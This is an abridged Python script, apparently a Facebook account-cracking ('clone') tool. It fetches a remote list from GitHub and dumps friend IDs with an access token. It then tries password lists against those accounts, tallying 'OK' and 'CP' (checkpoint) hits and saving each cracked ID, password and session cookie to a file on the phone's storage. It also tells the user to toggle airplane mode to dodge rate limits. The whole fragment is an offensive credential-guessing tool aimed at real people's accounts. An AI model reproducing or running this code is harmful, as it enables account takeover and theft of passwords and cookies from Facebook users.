...
try:
	...
	prox= requests.get('https://github.com/Alihamzadall512/aproval/blob/main/Aproval.txt').text	open('.Aproval.txt','w').write(prox)

except Exception as e:

	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mAlvino_adijaya_xy')

prox=open('.Aproval.txt','r').read().splitlines()
...
def uaku():
	...
	try:
		...
		ua=open('Aproval.txt','r').read().splitlines()
		...
		a=requests.get('https://github.com/Alihamzadall512/aproval/blob/main/Aproval.txt').text

		ua=open('.Aproval.txt','w')
...
def banner():
	...
	ban=''' © ❮«l٭※𓆩𝗔ɭɛ͜͡ɛɳɑ𓆪※٭l»❯   Facebook account                             
...
def dump_pengikut():
	...
	print('TYPE ME IF YOU WNT DUMP TOKN ID FRIENDS ')
...
def passwrd():
	...
	print(f'RESULTS {h}OK{u} CHEK : {h}ALEENA-OK/%s {b}'%(okc))

	print(f'RESULTS {k}CP{h} CHEK : {k}ALEENA-CP/%s {b}'%(cpc))

	print(f'TURN AROPLAN MODE AFTER CLONE IDZ ABOVE {h}1K{u} Idz\n')
	...
	for pw in pwv:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				cetak(nel('  [red]     😴😭yah cp mampus lu btw moga ijo😭😴 [red]'))
				...
				cetak(nel('[green]      🎀🤣 HELLO THIS Ilham-Rd 🤣🎀[green]')) 
...
def cracktouch(idf,pwv):
	...
	sys.stdout.write('\r%s ☬ %s/%s ☬ALEENA-OK:%s ☬ ALEENA-CP:%s ☬ %s%s%s ☬'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					open('/sdcard/ALEENA-OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
